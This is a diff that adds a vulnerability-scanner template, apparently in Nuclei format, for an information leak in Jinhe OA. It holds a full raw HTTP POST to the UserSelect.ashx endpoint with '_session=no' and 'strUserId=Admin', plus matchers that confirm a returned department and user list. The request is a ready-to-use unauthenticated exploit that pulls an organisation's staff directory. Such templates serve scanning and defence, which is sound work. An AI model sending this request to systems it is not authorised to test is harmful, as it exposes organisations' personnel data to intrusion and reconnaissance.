@@ -1,0 +1,30 @@
+id: poc-yaml-jinhe-oa-userselectashx-information-leak
+info:
+  name: Jinhe OA UserSelect.ashx Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        POST /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain;charset=UTF-8
+
+        strDeptID=
+        strUserId=Admin
+        strUserEsp=
+        strArchivesId=
+        deptIds=
+        IsShowChildrenDept=0
+        IsCascade=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "deptList\":[{\"childNodes\":[{\"childNodes\""
+          - "userList"
